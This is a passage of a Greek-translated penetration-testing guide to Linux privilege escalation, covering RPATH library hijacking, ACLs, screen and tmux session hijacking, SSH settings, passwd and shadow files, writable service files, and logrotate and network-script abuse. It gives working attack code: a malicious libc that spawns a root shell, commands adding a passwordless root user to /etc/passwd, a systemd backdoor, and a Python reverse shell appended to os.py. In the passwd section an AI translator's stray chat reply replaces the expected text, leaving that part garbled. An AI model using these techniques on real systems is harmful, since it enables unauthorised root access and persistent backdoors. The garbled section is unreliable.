Εάν για κάποιο λόγο **ένας χρήστης έχει δικαιώματα εγγραφής** σε οποιοδήποτε από τα μονοπάτια που υποδεικνύονται: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, οποιοδήποτε αρχείο μέσα στο `/etc/ld.so.conf.d/` ή οποιονδήποτε φάκελο που αναφέρεται σε κάποιο αρχείο ρυθμίσεων μέσα στο `/etc/ld.so.conf.d/*.conf` ίσως να μπορεί να αποκτήσει αυξημένα προνόμια.\ 
Δείτε **πώς να εκμεταλλευτείτε αυτή τη λανθασμένη διαμόρφωση** στην παρακάτω σελίδα:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Αντιγράφοντας τη lib στο `/var/tmp/flag15/`, αυτή θα χρησιμοποιηθεί από το πρόγραμμα σε αυτό το σημείο όπως ορίζεται στη μεταβλητή `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Στη συνέχεια, δημιουργήστε μια κακόβουλη βιβλιοθήκη στο `/var/tmp` με `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Δυνατότητες

Οι δυνατότητες του Linux παρέχουν ένα **υποσύνολο των διαθέσιμων δικαιωμάτων root σε μια διεργασία**. Αυτό ουσιαστικά διασπά τα **δικαιώματα του root σε μικρότερες και διακριτές μονάδες**. Καθεμία από αυτές τις μονάδες μπορεί στη συνέχεια να αποδοθεί ανεξάρτητα σε διεργασίες. Με αυτόν τον τρόπο το συνολικό σύνολο προνομίων μειώνεται, μειώνοντας τους κινδύνους εκμετάλλευσης.\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

Σε έναν κατάλογο, το **bit για "execute"** υποδηλώνει ότι ο αντίστοιχος χρήστης μπορεί να "**cd**" στον φάκελο.\
Το **bit "read"** υποδηλώνει ότι ο χρήστης μπορεί να **απαριθμήσει** τα **αρχεία**, και το **bit "write"** υποδηλώνει ότι ο χρήστης μπορεί να **διαγράψει** και να **δημιουργήσει** νέα **αρχεία**.

## ACLs

Λίστες Ελέγχου Πρόσβασης (ACLs) αντιπροσωπεύουν το δευτερεύον επίπεδο διακριτικών δικαιωμάτων, ικανό να **παρακάμπτει τα παραδοσιακά ugo/rwx δικαιώματα**. Αυτά τα δικαιώματα ενισχύουν τον έλεγχο πρόσβασης σε αρχεία ή καταλόγους επιτρέποντας ή απορρίπτοντας δικαιώματα σε συγκεκριμένους χρήστες που δεν είναι ιδιοκτήτες ή μέλη της ομάδας. **Αυτό το επίπεδο λεπτομέρειας εξασφαλίζει πιο ακριβή διαχείριση πρόσβασης**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Δώστε** στον χρήστη "kali" δικαιώματα ανάγνωσης και εγγραφής σε ένα αρχείο:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Αποκτήστε** αρχεία με συγκεκριμένα ACLs από το σύστημα:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Ανοιχτές shell συνεδρίες

Σε **παλαιότερες εκδόσεις** μπορεί να **hijack** κάποια **shell** συνεδρία διαφορετικού χρήστη (**root**).\
Σε **νεότερες εκδόσεις** θα μπορείς να **connect** σε screen συνεδρίες μόνο του **δικού σου χρήστη**. Ωστόσο, μπορείς να βρεις **ενδιαφέρουσες πληροφορίες μέσα στη συνεδρία**.

### screen sessions hijacking

**Λίστα screen συνεδριών**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Σύνδεση σε συνεδρία**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Αυτό ήταν ένα πρόβλημα με τις **παλιές εκδόσεις του tmux**. Δεν μπόρεσα να hijack μια συνεδρία του tmux (v2.1) που δημιουργήθηκε από τον root ως χρήστης χωρίς προνόμια.

**Λίστα συνεδριών tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Συνδέσου σε μια συνεδρία**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Δες το **Valentine box από HTB** για παράδειγμα.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Όλα τα SSL και SSH keys που δημιουργήθηκαν σε συστήματα βασισμένα σε Debian (Ubuntu, Kubuntu, etc) μεταξύ Σεπτεμβρίου 2006 και 13 Μαΐου 2008 ενδέχεται να έχουν επηρεαστεί από αυτό το bug.\
Αυτό το bug προκαλείται κατά τη δημιουργία ενός νέου ssh key σε αυτά τα OS, καθώς **only 32,768 variations were possible**. Αυτό σημαίνει ότι όλες οι πιθανότητες μπορούν να υπολογιστούν και **έχοντας το ssh public key μπορείτε να αναζητήσετε το αντίστοιχο private key**. Μπορείτε να βρείτε τις υπολογισμένες δυνατότητες εδώ: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Ενδιαφέρουσες τιμές διαμόρφωσης

- **PasswordAuthentication:** Καθορίζει εάν επιτρέπεται η πιστοποίηση με password. Η προεπιλογή είναι `no`.
- **PubkeyAuthentication:** Καθορίζει εάν επιτρέπεται η πιστοποίηση με public key. Η προεπιλογή είναι `yes`.
- **PermitEmptyPasswords**: Όταν η πιστοποίηση με password επιτρέπεται, καθορίζει αν ο server επιτρέπει σύνδεση σε λογαριασμούς με κενές συμβολοσειρές κωδικού. Η προεπιλογή είναι `no`.

### PermitRootLogin

Καθορίζει αν ο root μπορεί να συνδεθεί μέσω ssh, προεπιλογή είναι `no`. Πιθανές τιμές:

- `yes`: root can login using password and private key
- `without-password` or `prohibit-password`: root can only login with a private key
- `forced-commands-only`: Root can login only using private key and if the commands options are specified
- `no` : όχι

### AuthorizedKeysFile

Καθορίζει αρχεία που περιέχουν τα public keys που μπορούν να χρησιμοποιηθούν για την πιστοποίηση χρηστών. Μπορεί να περιέχει tokens όπως `%h`, τα οποία θα αντικατασταθούν από τον κατάλογο home. **Μπορείτε να υποδείξετε απόλυτες διαδρομές** (ξεκινώντας με `/`) ή **σχετικές διαδρομές από το home του χρήστη**. Για παράδειγμα:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Το SSH agent forwarding σου επιτρέπει να **χρησιμοποιείς τα τοπικά SSH keys σου αντί να αφήνεις keys** (χωρίς passphrases!) στον server σου. Έτσι, θα μπορείς να **μεταβείς** μέσω ssh **σε έναν host** και από εκεί να **μεταπηδήσεις σε άλλο** host **χρησιμοποιώντας** το **key** που βρίσκεται στον **αρχικό host** σου.

Πρέπει να ορίσεις αυτή την επιλογή στο `$HOME/.ssh.config` ως εξής:
```
Host example.com
ForwardAgent yes
```
Σημειώστε ότι αν το `Host` είναι `*`, κάθε φορά που ο χρήστης μεταβαίνει σε διαφορετική μηχανή, εκείνη η μηχανή θα μπορεί να αποκτήσει πρόσβαση στα κλειδιά (κάτι που αποτελεί ζήτημα ασφάλειας).

Το αρχείο `/etc/ssh_config` μπορεί να **αντικαταστήσει** αυτές τις **επιλογές** και να επιτρέψει ή να ακυρώσει αυτή τη ρύθμιση.\
Το αρχείο `/etc/sshd_config` μπορεί να **επιτρέψει** ή να **αποκλείσει** το ssh-agent forwarding με το keyword `AllowAgentForwarding` (default is allow).

Αν διαπιστώσετε ότι το Forward Agent είναι ρυθμισμένο σε ένα περιβάλλον, διαβάστε την παρακάτω σελίδα καθώς **ίσως να μπορείτε να το εκμεταλλευτείτε για να escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Ενδιαφέροντα Αρχεία

### Αρχεία προφίλ

Το αρχείο `/etc/profile` και τα αρχεία κάτω από το `/etc/profile.d/` είναι **scripts που εκτελούνται όταν ένας χρήστης ανοίγει ένα νέο shell**. Επομένως, αν μπορείτε να **γράψετε ή να τροποποιήσετε οποιοδήποτε από αυτά, μπορείτε να escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Αν βρεθεί κάποιο περίεργο profile script, πρέπει να το ελέγξετε για **ευαίσθητες πληροφορίες**.

### Αρχεία Passwd/Shadow

Ανάλογα με το OS, τα αρχεία `/etc/passwd` και `/etc/shadow` μπορεί να έχουν διαφορετικό όνομα ή να υπάρχει αντίγραφο ασφαλείας. Επομένως συνιστάται να **τα βρείτε όλα** και να **ελέγξετε αν μπορείτε να τα διαβάσετε** για να δείτε **αν υπάρχουν hashes** μέσα στα αρχεία:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Σε ορισμένες περιπτώσεις μπορείτε να βρείτε **password hashes** μέσα στο αρχείο `/etc/passwd` (ή σε αντίστοιχο αρχείο)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Εγγράψιμο /etc/passwd

Πρώτα, δημιούργησε ένα password με μία από τις παρακάτω εντολές.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Δεν έχω το περιεχόμενο του αρχείου src/linux-hardening/privilege-escalation/README.md για να το μεταφράσω. Στείλ' το εδώ ή επικόλλησέ το, και πες μου σε ποιο σημείο θέλεις να προσθέσω τη γραμμή με τον χρήστη `hacker`. Θες επίσης να δημιουργήσω εγώ έναν τυχαίο ασφαλή κωδικό και να τον εισάγω στο αρχείο; (Σημείωση: δεν θα εκτελέσω εντολές στο σύστημα — μόνο θα επεξεργαστώ/επιστρέψω το markdown.)
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Π.χ.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Μπορείτε τώρα να χρησιμοποιήσετε την εντολή `su` με `hacker:hacker`

Εναλλακτικά, μπορείτε να χρησιμοποιήσετε τις παρακάτω γραμμές για να προσθέσετε έναν dummy user χωρίς κωδικό πρόσβασης.\
ΠΡΟΣΟΧΗ: μπορεί να μειώσετε την τρέχουσα ασφάλεια του μηχανήματος.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ΣΗΜΕΙΩΣΗ: Σε πλατφόρμες BSD το `/etc/passwd` βρίσκεται στα `/etc/pwd.db` και `/etc/master.passwd`, επίσης το `/etc/shadow` μετονομάζεται σε `/etc/spwd.db`.

Πρέπει να ελέγξετε αν μπορείτε να **γράψετε σε κάποια ευαίσθητα αρχεία**. Για παράδειγμα, μπορείτε να γράψετε σε κάποιο **αρχείο διαμόρφωσης υπηρεσίας**;
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Για παράδειγμα, αν η μηχανή τρέχει έναν **tomcat** server και μπορείτε να **modify the Tomcat service configuration file inside /etc/systemd/,** τότε μπορείτε να τροποποιήσετε τις γραμμές:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Το backdoor σας θα εκτελεστεί την επόμενη φορά που θα ξεκινήσει το tomcat.

### Check Folders

Οι παρακάτω φάκελοι μπορεί να περιέχουν αντίγραφα ασφαλείας ή ενδιαφέρουσες πληροφορίες: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Πιθανότατα δεν θα μπορείτε να διαβάσετε το τελευταίο, αλλά δοκιμάστε)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Παράξενη Τοποθεσία/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Τροποποιημένα αρχεία τα τελευταία λεπτά
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB αρχεία
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml αρχεία
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Κρυφά αρχεία
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Σενάρια/Εκτελέσιμα στο PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Αρχεία Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Αντίγραφα ασφαλείας**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Γνωστά αρχεία που περιέχουν passwords

Διάβασε τον κώδικα του [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), ψάχνει για **πολλά πιθανά αρχεία που μπορεί να περιέχουν passwords**.\
**Ένα άλλο ενδιαφέρον εργαλείο** που μπορείς να χρησιμοποιήσεις για αυτό είναι: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) που είναι μια εφαρμογή ανοιχτού κώδικα που χρησιμοποιείται για να ανακτά πολλά passwords αποθηκευμένα σε ένα τοπικό υπολογιστή για Windows, Linux & Mac.

### Αρχεία καταγραφής

Αν μπορείς να διαβάζεις αρχεία καταγραφής, μπορεί να καταφέρεις να βρεις **ενδιαφέρουσες/εμπιστευτικές πληροφορίες μέσα σε αυτά**. Όσο πιο περίεργο είναι το αρχείο καταγραφής, τόσο πιο ενδιαφέρον πιθανώς θα είναι.\
Επίσης, κάποια "**κακά**" ρυθμισμένα (backdoored?) **audit logs** μπορεί να σου επιτρέψουν να **καταγράψεις passwords** μέσα στα audit logs όπως εξηγείται σε αυτή την ανάρτηση: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Για να **διαβάσετε τα logs, η ομάδα** [**adm**](interesting-groups-linux-pe/index.html#adm-group) θα είναι πραγματικά χρήσιμη.

### Shell αρχεία
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Πρέπει επίσης να ελέγχεις αρχεία που περιέχουν τη λέξη "**password**" στο **όνομά** τους ή μέσα στο **περιεχόμενο**, και επίσης να ελέγχεις για IPs και emails μέσα σε logs, ή για regexps με hashes.\
Δεν θα απαριθμήσω εδώ πώς να κάνεις όλα αυτά αλλά αν σε ενδιαφέρει μπορείς να ελέγξεις τους τελευταίους ελέγχους που εκτελεί το [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Εγγράψιμα αρχεία

### Python library hijacking

Αν γνωρίζεις από **πού** θα εκτελεστεί ένα python script και **μπορείς να γράψεις μέσα** σε αυτόν τον φάκελο ή μπορείς να **τροποποιήσεις python libraries**, μπορείς να τροποποιήσεις τη βιβλιοθήκη os και να την backdoor (αν μπορείς να γράψεις όπου θα εκτελεστεί το python script, κάνε copy και paste τη βιβλιοθήκη os.py).

Για να **backdoor the library** απλά πρόσθεσε στο τέλος της βιβλιοθήκης os.py την ακόλουθη γραμμή (άλλαξε IP και PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Εκμετάλλευση Logrotate

Μια ευπάθεια στο `logrotate` επιτρέπει σε χρήστες με **δικαιώματα εγγραφής** σε ένα αρχείο καταγραφής ή στους γονικούς καταλόγους του να αποκτήσουν ενδεχομένως αυξημένα προνόμια. Αυτό συμβαίνει επειδή το `logrotate`, που συχνά τρέχει ως **root**, μπορεί να χειραγωγηθεί ώστε να εκτελέσει αυθαίρετα αρχεία, ειδικά σε καταλόγους όπως _**/etc/bash_completion.d/**_. Είναι σημαντικό να ελέγχετε τα δικαιώματα όχι μόνο στο _/var/log_ αλλά και σε οποιονδήποτε κατάλογο όπου εφαρμόζεται η περιστροφή logs.

> [!TIP]
> Αυτή η ευπάθεια επηρεάζει την έκδοση του `logrotate` `3.18.0` και παλαιότερες

Περισσότερες λεπτομέρειες για την ευπάθεια μπορείτε να βρείτε σε αυτή τη σελίδα: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Μπορείτε να εκμεταλλευτείτε αυτή την ευπάθεια με [**logrotten**](https://github.com/whotwagner/logrotten).

Αυτή η ευπάθεια είναι πολύ παρόμοια με [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** οπότε όποτε διαπιστώνετε ότι μπορείτε να τροποποιήσετε logs, ελέγξτε ποιος τα διαχειρίζεται και ελέγξτε αν μπορείτε να αυξήσετε προνόμια αντικαθιστώντας τα logs με symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Αναφορά ευπάθειας:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Αν, για οποιονδήποτε λόγο, ένας χρήστης μπορεί να **γράψει** ένα `ifcf-<whatever>` script στο _/etc/sysconfig/network-scripts_ **ή** να **τροποποιήσει** ένα υπάρχον, τότε το **σύστημά σας είναι pwned**.

Τα network scripts, _ifcg-eth0_ για παράδειγμα, χρησιμοποιούνται για συνδέσεις δικτύου. Μοιάζουν ακριβώς με αρχεία .INI. Ωστόσο, είναι \~sourced\~ στο Linux από το Network Manager (dispatcher.d).

Στην περίπτωσή μου, το `NAME=` που αποδίδεται σε αυτά τα network scripts δεν χειρίζεται σωστά. Αν έχετε **κενά/διαστήματα στο όνομα το σύστημα προσπαθεί να εκτελέσει το μέρος μετά το κενό/διάστημα**. Αυτό σημαίνει ότι **ό,τι βρίσκεται μετά το πρώτο κενό εκτελείται ως root**.

Για παράδειγμα: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Σημείωση: το κενό ανάμεσα στο Network και το /bin/id_)

### **init, init.d, systemd, and rc.d**

Ο κατάλογος `/etc/init.d` περιέχει **scripts** για System V init (SysVinit), το **παραδοσιακό σύστημα διαχείρισης υπηρεσιών Linux**. Περιλαμβάνει scripts για `start`, `stop`, `restart` και μερικές φορές `reload` υπηρεσίες. Αυτά μπορούν να εκτελεστούν απευθείας ή μέσω symbolic links που βρίσκονται στο `/etc/rc?.d/`. Μια εναλλακτική διαδρομή σε Redhat συστήματα είναι `/etc/rc.d/init.d`.

Από την άλλη, το `/etc/init` σχετίζεται με το **Upstart**, ένα νεότερο **service management** που εισήχθη από την Ubuntu, χρησιμοποιώντας configuration files για εργασίες διαχείρισης υπηρεσιών. Παρά τη μετάβαση στο Upstart, τα SysVinit scripts εξακολουθούν να χρησιμοποιούνται παράλληλα με τις Upstart configurations λόγω ενός compatibility layer στο Upstart.

**systemd** εμφανίζεται ως ένας σύγχρονος initialization και service manager, παρέχοντας προηγμένες δυνατότητες όπως on-demand daemon starting, automount management και snapshots κατάστασης συστήματος. Οργανώνει αρχεία στο `/usr/lib/systemd/` για πακέτα διανομής και στο `/etc/systemd/system/` για τροποποιήσεις διαχειριστή, απλοποιώντας τη διαδικασία διαχείρισης συστήματος.

## Άλλα κόλπα

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Απόδραση από restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Τα Android rooting frameworks συχνά κάνουν hook ένα syscall για να αποκαλύψουν privileged kernel functionality σε έναν userspace manager. Αδύναμη manager authentication (π.χ., signature checks βασισμένα σε FD-order ή φτωχά password schemes) μπορεί να επιτρέψει σε μια local app να μιμηθεί τον manager και να escalate σε root σε ήδη-rooted συσκευές. Μάθετε περισσότερα και λεπτομέρειες exploitation εδώ:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Η regex-driven service discovery σε VMware Tools/Aria Operations μπορεί να εξάγει ένα binary path από process command lines και να το εκτελέσει με -v υπό privileged context. Επιτρεπτικά patterns (π.χ., χρήση του \S) μπορεί να ταιριάξουν attacker-staged listeners σε writable locations (π.χ., /tmp/httpd), οδηγώντας σε execution ως root (CWE-426 Untrusted Search Path).

Μάθετε περισσότερα και δείτε ένα γενικευμένο pattern που εφαρμόζεται και σε άλλα discovery/monitoring stacks εδώ:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Προστασίες ασφάλειας πυρήνα

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Περισσότερη βοήθεια

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
